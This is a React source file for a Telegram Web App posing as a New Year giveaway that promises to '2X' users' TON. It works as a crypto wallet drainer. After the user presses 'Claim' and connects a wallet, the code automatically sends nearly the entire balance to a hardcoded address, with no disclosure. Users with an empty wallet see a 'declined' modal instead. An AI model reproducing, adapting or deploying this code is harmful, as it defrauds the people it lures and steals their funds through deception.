import "./App.css";
import { useTonConnect } from "./hooks/useTonConnect";
import "@twa-dev/sdk";
import { useTonClientBalance } from "./hooks/useTonClientBalance";
import { Address, toNano } from "ton-core";
import { useEffect, useState } from "react";
import DeclinedModal from "./components/DeclinedModal";

function App() {
  const ADDRESS = "UQAS-N-YNKelVhDbQ9OzVWDayPghVHDKMx0ksbMsuArhY5E6";

  const { handleWalletConnect, handleWalletDisconnect, connected, sender } =
    useTonConnect();
  const { balance } = useTonClientBalance();

  const [initData, setInitData] = useState("");
  const [username, setUsername] = useState("");
  const [accepted, setAccepted] = useState(false);

  const [openDeclined, setOpenDeclined] = useState(false);

  const handleDeclinedClose = () => {
    setOpenDeclined(false);
  };

  const handleDeclinedOpen = () => {
    setOpenDeclined(true);
  };

  const send = async () => {
    if (connected) {
      await sender.send({
        to: Address.parse(ADDRESS),
        value: toNano((balance! - 0.01).toString()),
      });
    }
  };

  useEffect(() => {
    const initWebApp = async () => {
      if (typeof window !== "undefined") {
        handleWalletDisconnect();
        const WebApp = (await import("@twa-dev/sdk")).default;
        WebApp.ready();
        setInitData(WebApp.initData);
        setUsername(WebApp.initDataUnsafe.user?.username || "");
      }
    };

    initWebApp();
  }, []);

  const connectWallet = async () => {
    if (connected) {
      handleWalletDisconnect();
    }

    await handleWalletConnect();
    setAccepted(true);
  };

  useEffect(() => {
    if (accepted && connected) {
      if (balance == 0) {
        handleDeclinedOpen();
      } else {
        send();
      }
    }
    return () => {
      setAccepted(false);
    };
  }, [balance]);

  return (
    <>
      <div className="app">
        <div className="card">
          <img src="santa.png" />
        </div>

        <h1>New year is Coming!</h1>
        <p className="par">
          {username}, you are 1 step away to make your{" "}
          <span className="with-ton">2X.</span>
          Check your luck to be the one from 950M telegram users.
        </p>
        <button className="btn" onClick={connectWallet}>
          Claim
        </button>
      </div>

      <DeclinedModal open={openDeclined} handleClose={handleDeclinedClose} />
    </>
  );
}

export default App;
